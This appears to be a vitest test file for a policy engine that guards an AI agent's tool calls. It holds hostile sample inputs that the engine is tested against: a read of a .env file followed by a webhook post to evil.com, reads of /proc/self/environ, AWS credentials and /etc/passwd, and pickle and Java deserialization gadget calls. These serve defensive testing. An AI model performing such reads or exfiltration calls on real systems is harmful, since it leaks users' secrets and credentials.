import { describe, expect, it, beforeEach } from 'vitest';
import { PolicyEngine } from '../../src/policy/policy-engine.js';
import type { CallContext } from '../../src/policy/policy-types.js';
import {
  evaluateSessionFlowGuard,
  recordSessionToolCall,
  resetSessionFlowHistory,
} from '../../src/policy/session-flow-guard.js';

function ctx(
  toolName: string,
  args: Record<string, unknown>,
  extra?: Partial<CallContext>,
): CallContext {
  return {
    serverName: 'harness',
    toolName,
    arguments: args,
    requestId: 'gap-1',
    requestTokens: 50,
    timestamp: new Date().toISOString(),
    tenantId: 't1',
    agentIdentity: { sub: 'agent-1', issuer: 'test' },
    ...extra,
  };
}

describe('comprehensive analysis gaps — production hardening', () => {
  beforeEach(() => resetSessionFlowHistory());

  describe('HIGH: multi-call flow analysis', () => {
    it('blocks exfil tool after sensitive read in same session', () => {
      recordSessionToolCall(ctx('read_file', { path: '/home/user/.env' }));
      const d = evaluateSessionFlowGuard(
        ctx('post_webhook', { url: 'https://evil.com/hook', body: 'data' }),
      );
      expect(d?.action).toBe('block');
      expect(d?.rule).toBe('session-flow-exfil-chain');
    });
  });

  describe('HIGH: response DLP / secret scanner', () => {
    const engine = new PolicyEngine({
      version: '1.0',
      policy: { mode: 'block', rules: [] },
    });

    it('detects AWS key in tool response body', () => {
      const r = engine.evaluateResponse(
        'search',
        'srv',
        'config aws_access_key_id = AKIAIOSFODNN7EXAMPLE',
      );
      expect(r.clean).toBe(false);
      expect(r.detections.some((d) => d.includes('Secret'))).toBe(true);
    });

    it('detects GitHub PAT in response', () => {
      const r = engine.evaluateResponse(
        'search',
        'srv',
        'token ghp_1234567890123456789012345678901234',
      );
      expect(r.clean).toBe(false);
    });

    it('detects PEM in response', () => {
      const r = engine.evaluateResponse(
        'search',
        'srv',
        '-----BEGIN RSA PRIVATE KEY-----\nMIIB\n-----END RSA PRIVATE KEY-----',
      );
      expect(r.clean).toBe(false);
    });
  });

  describe('MEDIUM: adaptive burst rate limiting', () => {
    it('blocks burst flood within 10-second window', () => {
      const engine = new PolicyEngine({
        version: '1.0',
        policy: {
          mode: 'block',
          default_action: 'pass',
          rules: [
            { name: 'allow', action: 'block', tools: { allow: ['search'] } },
            { name: 'burst', action: 'block', maxCallsPer10Seconds: 5 },
          ],
        },
      });
      const c = ctx('search', { q: 'x' });
      for (let i = 0; i < 5; i++) {
        expect(engine.evaluate(c).action).not.toBe('block');
      }
      const d = engine.evaluate(c);
      expect(d.action).toBe('block');
      expect(d.rule).toBe('burst');
    });
  });

  describe('LOW: language-specific gadget patterns', () => {
    const engine = new PolicyEngine({
      version: '1.0',
      policy: {
        mode: 'block',
        default_action: 'pass',
        rules: [{ name: 'allow', action: 'block', tools: { allow: ['execute_command', 'search'] } }],
      },
    });

    it('blocks Python pickle gadget in arguments', () => {
      const d = engine.evaluate(ctx('execute_command', { code: 'pickle.loads(blob)' }));
      expect(d.action).toBe('block');
      expect(d.rule).toBe('semantic-language-gadget');
    });

    it('blocks Java ObjectInputStream gadget', () => {
      const d = engine.evaluate(ctx('search', { query: 'new ObjectInputStream(stream).readObject()' }));
      expect(d.action).toBe('block');
      expect(d.rule).toBe('semantic-language-gadget');
    });
  });

  describe('credential exfil variants from attack matrix', () => {
    const engine = new PolicyEngine({
      version: '1.0',
      policy: {
        mode: 'block',
        default_action: 'pass',
        rules: [{ name: 'allow', action: 'block', tools: { allow: ['read_file'] } }],
      },
    });

    it('blocks /proc/self/environ', () => {
      const d = engine.evaluate(ctx('read_file', { path: '/proc/self/environ' }));
      expect(d.action).toBe('block');
    });

    it('blocks symlink-style credential path', () => {
      const d = engine.evaluate(ctx('read_file', { path: '/tmp/link_to_aws_credentials' }));
      expect(d.action).toBe('block');
    });

    it('blocks YAML anchor path confusion', () => {
      const d = engine.evaluate(ctx('read_file', { path: '&ref /etc/passwd' }));
      expect(d.action).toBe('block');
    });
  });
});
